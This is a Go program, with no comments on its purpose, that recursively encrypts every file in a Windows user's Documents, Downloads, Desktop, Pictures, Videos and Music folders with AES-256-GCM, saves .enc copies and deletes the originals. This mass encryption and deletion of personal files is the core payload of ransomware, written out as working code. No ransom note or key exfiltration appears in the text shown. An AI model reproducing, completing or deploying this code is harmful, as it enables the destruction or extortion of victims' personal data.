package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// Get AES-256 key from environment variable
func getKey() ([]byte, error) {
	key := os.Getenv("AES_KEY") // Read key from env variable
	if len(key) != 32 {
		return nil, fmt.Errorf("invalid key length: AES-256 requires a 32-byte key")
	}
	return []byte(key), nil
}

// Encrypt a single file and delete the original
func encryptFile(filename string, key []byte) error {
	plaintext, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("error reading file: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("error creating cipher: %w", err)
	}

	nonce := make([]byte, 12) // GCM standard nonce size
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Errorf("error generating nonce: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("error creating GCM: %w", err)
	}

	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	encryptedFilename := filename + ".enc"
	err = os.WriteFile(encryptedFilename, ciphertext, 0644)
	if err != nil {
		return fmt.Errorf("error writing encrypted file: %w", err)
	}

	// Delete the original file
	err = os.Remove(filename)
	if err != nil {
		return fmt.Errorf("error deleting original file: %w", err)
	}

	fmt.Println("Encrypted:", filename)
	return nil
}

// Recursively encrypt files in the given folder
func encryptFolder(folder string, key []byte) {
	filepath.Walk(folder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() && !strings.HasSuffix(path, ".enc") {
			encryptFile(path, key)
		}
		return nil
	})
}

func main() {
	key, err := getKey()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Define major user folders
	folders := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		filepath.Join(os.Getenv("USERPROFILE"), "Pictures"),
		filepath.Join(os.Getenv("USERPROFILE"), "Videos"),
		filepath.Join(os.Getenv("USERPROFILE"), "Music"),
	}

	// Encrypt all files in target folders
	for _, folder := range folders {
		fmt.Println("Encrypting files in:", folder)
		encryptFolder(folder, key)
	}

	fmt.Println("All target folders encrypted successfully!")
}
